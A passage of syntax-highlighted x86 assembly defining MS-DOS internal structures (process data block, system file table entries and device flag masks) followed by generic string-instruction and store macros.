</span><span class="sc5">PDB_Fatal_abort</span><span class="sc0">     </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; pointer to fatal error</span><span class="sc0">
</span><span class="sc1">;----+----+----+----+----+----+----+----+----+----+----+----+----+----+----;</span><span class="sc0">
</span><span class="sc1">;            C  A  V  E  A  T     P  R  O  G  R  A  M  M  E  R             ;</span><span class="sc0">
</span><span class="sc1">;                                                                          ;</span><span class="sc0">
</span><span class="sc5">PDB_Parent_PID</span><span class="sc0">      </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; PID of parent (terminate PID)</span><span class="sc0">
</span><span class="sc5">PDB_JFN_Table</span><span class="sc0">       </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc5">FilPerProc</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
                                        </span><span class="sc1">; indices into system table</span><span class="sc0">
</span><span class="sc1">;                                                                          ;</span><span class="sc0">
</span><span class="sc1">;            C  A  V  E  A  T     P  R  O  G  R  A  M  M  E  R             ;</span><span class="sc0">
</span><span class="sc1">;----+----+----+----+----+----+----+----+----+----+----+----+----+----+----;</span><span class="sc0">
</span><span class="sc5">PDB_environ</span><span class="sc0">         </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; seg addr of environment</span><span class="sc0">
</span><span class="sc1">;----+----+----+----+----+----+----+----+----+----+----+----+----+----+----;</span><span class="sc0">
</span><span class="sc1">;            C  A  V  E  A  T     P  R  O  G  R  A  M  M  E  R             ;</span><span class="sc0">
</span><span class="sc1">;                                                                          ;</span><span class="sc0">
</span><span class="sc5">PDB_User_stack</span><span class="sc0">      </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; stack of self during system calls</span><span class="sc0">
</span><span class="sc5">PDB_JFN_Length</span><span class="sc0">      </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; number of handles allowed</span><span class="sc0">
</span><span class="sc5">PDB_JFN_Pointer</span><span class="sc0">     </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; pointer to JFN table</span><span class="sc0">
</span><span class="sc5">PDB_Next_PDB</span><span class="sc0">        </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; pointer to nested PDB's</span><span class="sc0">
</span><span class="sc5">PDB_PAD1</span><span class="sc0">            </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">14h</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc1">;                                                                          ;</span><span class="sc0">
</span><span class="sc1">;            C  A  V  E  A  T     P  R  O  G  R  A  M  M  E  R             ;</span><span class="sc0">
</span><span class="sc1">;----+----+----+----+----+----+----+----+----+----+----+----+----+----+----;</span><span class="sc0">
</span><span class="sc5">PDB_Call_system</span><span class="sc0">     </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">5</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">   </span><span class="sc1">; portable method of system call</span><span class="sc0">
</span><span class="sc1">;----+----+----+----+----+----+----+----+----+----+----+----+----+----+----;</span><span class="sc0">
</span><span class="sc1">;            C  A  V  E  A  T     P  R  O  G  R  A  M  M  E  R             ;</span><span class="sc0">
</span><span class="sc1">;                                                                          ;</span><span class="sc0">
</span><span class="sc5">PDB_PAD2</span><span class="sc0">            </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">7h</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc1">;                                                                          ;</span><span class="sc0">
</span><span class="sc1">;            C  A  V  E  A  T     P  R  O  G  R  A  M  M  E  R             ;</span><span class="sc0">
</span><span class="sc1">;----+----+----+----+----+----+----+----+----+----+----+----+----+----+----;</span><span class="sc0">
</span><span class="sc5">Process_data_block</span><span class="sc0">  </span><span class="sc9">ENDS</span><span class="sc0">

</span><span class="sc1">;       SCCSID = @(#)sf.asm     1.1 85/04/10</span><span class="sc0">
</span><span class="sc1">;BREAK &lt;Internal system file table format&gt;</span><span class="sc0">

</span><span class="sc1">;----+----+----+----+----+----+----+----+----+----+----+----+----+----+----;</span><span class="sc0">
</span><span class="sc1">;            C  A  V  E  A  T     P  R  O  G  R  A  M  M  E  R             ;</span><span class="sc0">
</span><span class="sc1">;                                                                          ;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; system file table</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">SF</span><span class="sc0">              </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">SFLink</span><span class="sc0">          </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">SFCount</span><span class="sc0">         </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; number of entries</span><span class="sc0">
</span><span class="sc5">SFTable</span><span class="sc0">         </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; beginning of array of the following</span><span class="sc0">
</span><span class="sc5">SF</span><span class="sc0">              </span><span class="sc9">ENDS</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; system file table entry</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">sf_entry</span><span class="sc0">        </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">sf_ref_count</span><span class="sc0">    </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; number of processes sharing entry</span><span class="sc0">
                                        </span><span class="sc1">;   if FCB then ref count</span><span class="sc0">
</span><span class="sc5">sf_mode</span><span class="sc0">         </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; mode of access or high bit on if FCB</span><span class="sc0">
</span><span class="sc5">sf_attr</span><span class="sc0">         </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; attribute of file</span><span class="sc0">
</span><span class="sc5">sf_flags</span><span class="sc0">        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">;Bits 8-15</span><span class="sc0">
                                        </span><span class="sc1">; Bit 15 = 1 if remote file</span><span class="sc0">
                                        </span><span class="sc1">;        = 0 if local file or device</span><span class="sc0">
                                        </span><span class="sc1">; Bit 14 = 1 if date/time is not to be</span><span class="sc0">
                                        </span><span class="sc1">;   set from clock at CLOSE.  Set by</span><span class="sc0">
                                        </span><span class="sc1">;   FILETIMES and FCB_CLOSE.  Reset by</span><span class="sc0">
                                        </span><span class="sc1">;   other reseters of the dirty bit</span><span class="sc0">
                                        </span><span class="sc1">;   (WRITE)</span><span class="sc0">
                                        </span><span class="sc1">; Bit 13 = Pipe bit (reserved)</span><span class="sc0">
                                        </span><span class="sc1">;</span><span class="sc0">
                                        </span><span class="sc1">; Bits 0-7 (old FCB_devid bits)</span><span class="sc0">
                                        </span><span class="sc1">; If remote file or local file, bit</span><span class="sc0">
                                        </span><span class="sc1">; 6=0 if dirty Device ID number, bits</span><span class="sc0">
                                        </span><span class="sc1">; 0-5 if local file.</span><span class="sc0">
                                        </span><span class="sc1">; bit 7=0 for local file, bit 7</span><span class="sc0">
                                        </span><span class="sc1">;      =1 for local I/O device</span><span class="sc0">
                                        </span><span class="sc1">; If local I/O device, bit 6=0 if EOF</span><span class="sc0">
                                        </span><span class="sc1">;    Bit 5=1 if Raw mode</span><span class="sc0">
                                        </span><span class="sc1">;    Bit 0=1 if console input device</span><span class="sc0">
                                        </span><span class="sc1">;    Bit 1=1 if console output device</span><span class="sc0">
                                        </span><span class="sc1">;    Bit 2=1 if null device</span><span class="sc0">
                                        </span><span class="sc1">;    Bit 3=1 if clock device</span><span class="sc0">
</span><span class="sc5">sf_devptr</span><span class="sc0">       </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; Points to DPB if local file, points</span><span class="sc0">
                                        </span><span class="sc1">; to device header if local device,</span><span class="sc0">
                                        </span><span class="sc1">; points to net device header if</span><span class="sc0">
                                        </span><span class="sc1">; remote</span><span class="sc0">
</span><span class="sc5">sf_firclus</span><span class="sc0">      </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; First cluster of file (bit 15 = 0)</span><span class="sc0">
</span><span class="sc5">sf_time</span><span class="sc0">         </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; Time associated with file</span><span class="sc0">
</span><span class="sc5">sf_date</span><span class="sc0">         </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; Date associated with file</span><span class="sc0">
</span><span class="sc5">sf_size</span><span class="sc0">         </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; Size associated with file</span><span class="sc0">
</span><span class="sc5">sf_position</span><span class="sc0">     </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; R/W pointer or LRU count for FCBs</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Starting here, the next 7 bytes may be used by the file system to store an</span><span class="sc0">
</span><span class="sc1">; ID</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">sf_cluspos</span><span class="sc0">      </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; Position of last cluster accessed</span><span class="sc0">
</span><span class="sc5">sf_lstclus</span><span class="sc0">      </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; Last cluster accessed</span><span class="sc0">
</span><span class="sc5">sf_dirsec</span><span class="sc0">       </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; Sector number for this file</span><span class="sc0">
</span><span class="sc5">sf_dirpos</span><span class="sc0">       </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; Offset of this entry in the above</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; End of 7 bytes of file-system specific info.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">sf_name</span><span class="sc0">         </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">11</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">      </span><span class="sc1">; 11 character name that is in the</span><span class="sc0">
                                        </span><span class="sc1">; directory entry.  This is used by</span><span class="sc0">
                                        </span><span class="sc1">; close to detect file deleted and</span><span class="sc0">
                                        </span><span class="sc1">; disk changed errors.</span><span class="sc0">
</span><span class="sc1">; SHARING INFO</span><span class="sc0">
</span><span class="sc5">sf_chain</span><span class="sc0">        </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; link to next SF</span><span class="sc0">
</span><span class="sc5">sf_UID</span><span class="sc0">          </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">sf_PID</span><span class="sc0">          </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">sf_MFT</span><span class="sc0">          </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">sf_entry</span><span class="sc0">        </span><span class="sc9">ENDS</span><span class="sc0">

</span><span class="sc5">sf_netid</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">sf_cluspos</span><span class="sc0">
</span><span class="sc5">sf_OpenAge</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">sf_position</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">sf_LRU</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">sf_position</span><span class="sc0">

</span><span class="sc5">sf_default_number</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">5h</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Note that we need to mark an SFT as being busy for OPEN/CREATE.  This is</span><span class="sc0">
</span><span class="sc1">; because an INT 24 may prevent us from 'freeing' it.  We mark this as such</span><span class="sc0">
</span><span class="sc1">; by placing a -1 in the ref_count field.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">sf_busy</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">

</span><span class="sc1">; mode mask for FCB detection</span><span class="sc0">
</span><span class="sc5">sf_isfcb</span><span class="sc0">                </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">1000000000000000B</span><span class="sc0">

</span><span class="sc1">; Flag word masks</span><span class="sc0">
</span><span class="sc5">sf_isnet</span><span class="sc0">                </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">1000000000000000B</span><span class="sc0">
</span><span class="sc5">sf_close_nodate</span><span class="sc0">         </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">0100000000000000B</span><span class="sc0">
</span><span class="sc5">sf_pipe</span><span class="sc0">                 </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">0010000000000000B</span><span class="sc0">
</span><span class="sc5">sf_no_inherit</span><span class="sc0">           </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">0001000000000000B</span><span class="sc0">
</span><span class="sc5">sf_net_spool</span><span class="sc0">            </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">0000100000000000B</span><span class="sc0">

</span><span class="sc1">; Local file/device flag masks</span><span class="sc0">
</span><span class="sc5">devid_file_clean</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">40h</span><span class="sc0">     </span><span class="sc1">; true if file and not written</span><span class="sc0">
</span><span class="sc5">devid_file_mask_drive</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">3Fh</span><span class="sc0">     </span><span class="sc1">; mask for drive number</span><span class="sc0">

</span><span class="sc5">devid_device</span><span class="sc0">            </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">80h</span><span class="sc0">     </span><span class="sc1">; true if a device</span><span class="sc0">
</span><span class="sc5">devid_device_EOF</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">40h</span><span class="sc0">     </span><span class="sc1">; true if end of file reached</span><span class="sc0">
</span><span class="sc5">devid_device_raw</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">20h</span><span class="sc0">     </span><span class="sc1">; true if in raw mode</span><span class="sc0">
</span><span class="sc5">devid_device_special</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">10h</span><span class="sc0">     </span><span class="sc1">; true if special device</span><span class="sc0">
</span><span class="sc5">devid_device_clock</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">08h</span><span class="sc0">     </span><span class="sc1">; true if clock device</span><span class="sc0">
</span><span class="sc5">devid_device_null</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">04h</span><span class="sc0">     </span><span class="sc1">; true if null device</span><span class="sc0">
</span><span class="sc5">devid_device_con_out</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">02h</span><span class="sc0">     </span><span class="sc1">; true if console output</span><span class="sc0">
</span><span class="sc5">devid_device_con_in</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">01h</span><span class="sc0">     </span><span class="sc1">; true if consle input</span><span class="sc0">
</span><span class="sc1">;                                                                          ;</span><span class="sc0">
</span><span class="sc1">;            C  A  V  E  A  T     P  R  O  G  R  A  M  M  E  R             ;</span><span class="sc0">
</span><span class="sc1">;----+----+----+----+----+----+----+----+----+----+----+----+----+----+----;</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; structure of devid field as returned by IOCTL is:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       BIT     7   6   5   4   3   2   1   0</span><span class="sc0">
</span><span class="sc1">;             |---|---|---|---|---|---|---|---|</span><span class="sc0">
</span><span class="sc1">;             | I | E | R | S | I | I | I | I |</span><span class="sc0">
</span><span class="sc1">;             | S | O | A | P | S | S | S | S |</span><span class="sc0">
</span><span class="sc1">;             | D | F | W | E | C | N | C | C |</span><span class="sc0">
</span><span class="sc1">;             | E |   |   | C | L | U | O | I |</span><span class="sc0">
</span><span class="sc1">;             | V |   |   | L | K | L | T | N |</span><span class="sc0">
</span><span class="sc1">;             |---|---|---|---|---|---|---|---|</span><span class="sc0">
</span><span class="sc1">;       ISDEV = 1 if this channel is a device</span><span class="sc0">
</span><span class="sc1">;             = 0 if this channel is a disk file</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       If ISDEV = 1</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;             EOF = 0 if End Of File on input</span><span class="sc0">
</span><span class="sc1">;             RAW = 1 if this device is in Raw mode</span><span class="sc0">
</span><span class="sc1">;                 = 0 if this device is cooked</span><span class="sc0">
</span><span class="sc1">;             ISCLK = 1 if this device is the clock device</span><span class="sc0">
</span><span class="sc1">;             ISNUL = 1 if this device is the null device</span><span class="sc0">
</span><span class="sc1">;             ISCOT = 1 if this device is the console output</span><span class="sc0">
</span><span class="sc1">;             ISCIN = 1 if this device is the console input</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       If ISDEV = 0</span><span class="sc0">
</span><span class="sc1">;             EOF = 0 if channel has been written</span><span class="sc0">
</span><span class="sc1">;             Bits 0-5  are  the  block  device  number  for</span><span class="sc0">
</span><span class="sc1">;                 the channel (0 = A, 1 = B, ...)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">devid_ISDEV</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">80h</span><span class="sc0">
</span><span class="sc5">devid_EOF</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">40h</span><span class="sc0">
</span><span class="sc5">devid_RAW</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">20h</span><span class="sc0">
</span><span class="sc5">devid_SPECIAL</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">10H</span><span class="sc0">
</span><span class="sc5">devid_ISCLK</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">08h</span><span class="sc0">
</span><span class="sc5">devid_ISNUL</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">04h</span><span class="sc0">
</span><span class="sc5">devid_ISCOT</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">02h</span><span class="sc0">
</span><span class="sc5">devid_ISCIN</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">01h</span><span class="sc0">

</span><span class="sc5">devid_block_dev</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">1Fh</span><span class="sc0">             </span><span class="sc1">; mask for block device number</span><span class="sc0">

</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">s_y</span><span class="sc0"> </span><span class="sc9">MACRO</span><span class="sc0"> </span><span class="sc5">oprt</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">cntr</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">dsiz</span><span class="sc0">
    </span><span class="sc4">&amp;</span><span class="sc5">oprt</span><span class="sc4">&amp;</span><span class="sc5">cntr</span><span class="sc4">&amp;</span><span class="sc5">dsiz</span><span class="sc0"> </span><span class="sc9">MACRO</span><span class="sc0">
        </span><span class="sc9">REPT</span><span class="sc0"> </span><span class="sc5">cntr</span><span class="sc0">
            </span><span class="sc4">&amp;</span><span class="sc5">oprt</span><span class="sc4">&amp;&amp;</span><span class="sc5">dsiz</span><span class="sc0">
        </span><span class="sc9">ENDM</span><span class="sc0">
    </span><span class="sc9">ENDM</span><span class="sc0">
</span><span class="sc9">ENDM</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">s_z</span><span class="sc0"> </span><span class="sc9">MACRO</span><span class="sc0"> </span><span class="sc5">oprt</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">cntr</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">cmmd</span><span class="sc0">
    </span><span class="sc5">oprt</span><span class="sc4">&amp;</span><span class="sc5">cntr</span><span class="sc0"> </span><span class="sc9">MACRO</span><span class="sc0">
        </span><span class="sc9">REPT</span><span class="sc0"> </span><span class="sc5">cntr</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
            </span><span class="sc4">&amp;</span><span class="sc5">cmmd</span><span class="sc4">&amp;</span><span class="sc5">w</span><span class="sc0">
        </span><span class="sc9">ENDM</span><span class="sc0">
        </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">cntr</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
            </span><span class="sc4">&amp;</span><span class="sc5">cmmd</span><span class="sc4">&amp;</span><span class="sc5">b</span><span class="sc0">
        </span><span class="sc9">ENDIF</span><span class="sc0">
    </span><span class="sc9">ENDM</span><span class="sc0">
</span><span class="sc9">ENDM</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc9">IRPC</span><span class="sc0"> </span><span class="sc5">cntr</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345</span><span class="sc0">
    </span><span class="sc9">IRP</span><span class="sc0"> </span><span class="sc5">dsiz</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">B</span><span class="sc4">,</span><span class="sc5">W</span><span class="sc4">,</span><span class="sc5">D</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc9">IRP</span><span class="sc0"> </span><span class="sc5">oprt</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc6">stos</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">scas</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">lods</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">movs</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">cmps</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">ins</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">outs</span><span class="sc4">&gt;</span><span class="sc0">
            </span><span class="sc5">s_y</span><span class="sc0"> </span><span class="sc5">oprt</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">cntr</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">dsiz</span><span class="sc0">
        </span><span class="sc9">ENDM</span><span class="sc0">
    </span><span class="sc9">ENDM</span><span class="sc0">
    </span><span class="sc5">s_z</span><span class="sc0">  </span><span class="sc6">movs</span><span class="sc4">,</span><span class="sc0">    </span><span class="sc5">cntr</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">movs</span><span class="sc0">
    </span><span class="sc5">s_z</span><span class="sc0">  </span><span class="sc5">add_di</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">cntr</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">scas</span><span class="sc0">
    </span><span class="sc5">s_z</span><span class="sc0">  </span><span class="sc5">add_si</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc5">cntr</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">lods</span><span class="sc0">
    </span><span class="sc5">s_z</span><span class="sc0">  </span><span class="sc5">add_sdi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">cntr</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">cmps</span><span class="sc0">
</span><span class="sc9">ENDM</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc9">PURGE</span><span class="sc0"> </span><span class="sc5">s_y</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">s_z</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">STO_BYTE</span><span class="sc0">        </span><span class="sc9">MACRO</span><span class="sc0"> </span><span class="sc5">value</span><span class="sc4">:</span><span class="sc10">REQ</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">value</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc9">ENDM</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">STO_WORD_</span><span class="sc0">       </span><span class="sc9">MACRO</span><span class="sc0"> </span><span class="sc5">value</span><span class="sc0">
                    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">value</span><span class="sc0">
                    </span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc9">ENDM</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">STO_WORD</span><span class="sc0">        </span><span class="sc9">MACRO</span><span class="sc0"> </span><span class="sc5">value</span><span class="sc0">
                </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">value</span><span class="sc0"> </span><span class="sc9">NE</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">value</span><span class="sc0">
                </span><span class="sc9">ELSE</span><span class="sc0">
                    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc9">ENDIF</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc9">ENDM</span><span class="sc0">
